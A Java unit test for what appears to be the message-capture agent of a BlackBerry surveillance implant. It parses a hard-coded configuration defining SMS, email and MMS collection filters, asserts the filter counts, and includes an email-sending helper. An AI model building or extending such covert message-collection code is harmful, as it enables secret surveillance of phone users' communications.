package com.ht.tests.unit;

import java.util.Calendar;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.AddressException;
import net.rim.blackberry.api.mail.Folder;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MessagingException;
import net.rim.blackberry.api.mail.Store;
import net.rim.blackberry.api.mail.Transport;

import com.ht.rcs.blackberry.AgentManager;
import com.ht.rcs.blackberry.agent.Agent;
import com.ht.rcs.blackberry.agent.MessageAgent;
import com.ht.tests.AssertException;
import com.ht.tests.TestUnit;
import com.ht.tests.Tests;

public class UT_SmsAgent extends TestUnit{

	 protected static Store _store;
		protected final static int[] HEADER_KEYS = { Message.RecipientType.TO,
		        Message.RecipientType.CC, Message.RecipientType.BCC };
	byte[] conf_example = new byte[]{32, 0, 0, 1, 49, 0, 50, 0, 55, 0, 48, 0, 55, 0, 51, 0, 56, 0, 55, 0, 55, 0, 57, 0, 77, 0, 65, 0, 75, 0, 77, 0, 65, 0, 75, 0, 120, 0, 0, 2, 116, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 64, 1, 0, 0, 0, 73, 0, 80, 0, 77, 0, 46, 0, 83, 0, 77, 0, 83, 0, 84, 0, 101, 0, 120, 0, 116, 0, 42, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, -128, 54, -33, -12, 10, -48, -54, 1, 0, 0, 0, 0, 0, -128, 62, -43, -34, -79, -99, 1, 0, 0, 0, 0, 0, 0, 0, 0, 120, 0, 0, 2, 116, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 64, 1, 0, 0, 0, 73, 0, 80, 0, 77, 0, 46, 0, 78, 0, 111, 0, 116, 0, 101, 0, 42, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, -128, 54, -33, -12, 10, -48, -54, 1, 0, 0, 0, 0, 0, -128, 62, -43, -34, -79, -99, 1, 0, 0, 0, 0, 0, 0, 0, 0, 120, 0, 0, 2, 116, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 64, 1, 0, 0, 0, 73, 0, 80, 0, 77, 0, 46, 0, 77, 0, 77, 0, 83, 0, 42, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, -128, 54, -33, -12, 10, -48, -54, 1, 0, 0, 0, 0, 0, -128, 62, -43, -34, -79, -99, 1, 0, 0, 0, 0, 0, 0, 0, 0, 120, 0, 0, 2, 116, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 73, 0, 80, 0, 77, 0, 46, 0, 83, 0, 77, 0, 83, 0, 84, 0, 101, 0, 120, 0, 116, 0, 42, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, -128, 54, -33, -12, 10, -48, -54, 1, 0, 0, 0, 0, 0, -128, 62, -43, -34, -79, -99, 1, 0, 0, 0, 0, 0, 0, 0, 0, 120, 0, 0, 2, 116, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 73, 0, 80, 0, 77, 0, 46, 0, 78, 0, 111, 0, 116, 0, 101, 0, 42, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, -128, 54, -33, -12, 10, -48, -54, 1, 0, 0, 0, 0, 0, -128, 62, -43, -34, -79, -99, 1, 0, 0, 0, 0, 0, 0, 0, 0, 120, 0, 0, 2, 116, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 73, 0, 80, 0, 77, 0, 46, 0, 77, 0, 77, 0, 83, 0, 42, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, -128, 54, -33, -12, 10, -48, -54, 1, 0, 0, 0, 0, 0, -128, 62, -43, -34, -79, -99, 1, 0, 0, 0, 0, 0, 0, 0, 0};

	public UT_SmsAgent(String name, Tests tests) {
		super(name, tests);
	}

	public boolean run() throws AssertException {
		parseConfTest();
		return true;
	}

	private void parseConfTest() throws AssertException {
		MessageAgent messageAgent = (MessageAgent) Agent.factory(Agent.AGENT_MESSAGE, true, conf_example);
		debug.trace(messageAgent.toString());
		
		AssertThat(messageAgent.filtersEMAIL.size()==2,"Wrong email filter number");
		AssertThat(messageAgent.filtersMMS.size()==2,"Wrong mms filter number");
		AssertThat(messageAgent.filtersSMS.size()==2,"Wrong sms filter number");
	}

	/**
	 * funzione di test che serve a spedire le email
	 * @param dest
	 * @param from
	 * @param subject
	 * @param body
	 */
	public void sendEmail(String dest, String from, String subject, String body) {
		Folder outbox = _store.findFolder("Outbox")[0];
		Message message = new Message(outbox);
		try {
			message.setContent(body);
		} catch (MessagingException e) {
			e.printStackTrace();
		}

		message.setSentDate(Calendar.getInstance().getTime());
		Address[] addresses = new Address[2];
		try {
			addresses[0] = new Address(dest, "");
			addresses[1] = new Address(from, "");
		} catch (AddressException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

		try {
			message.addRecipients(HEADER_KEYS[0], addresses);
			message.setFrom(addresses[1]);
		} catch (MessagingException e) {
			e.printStackTrace();
		}

		message.setSubject(subject);
		if (message != null) {
			try {
				Transport.send(message);
			} catch (MessagingException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

	}
}
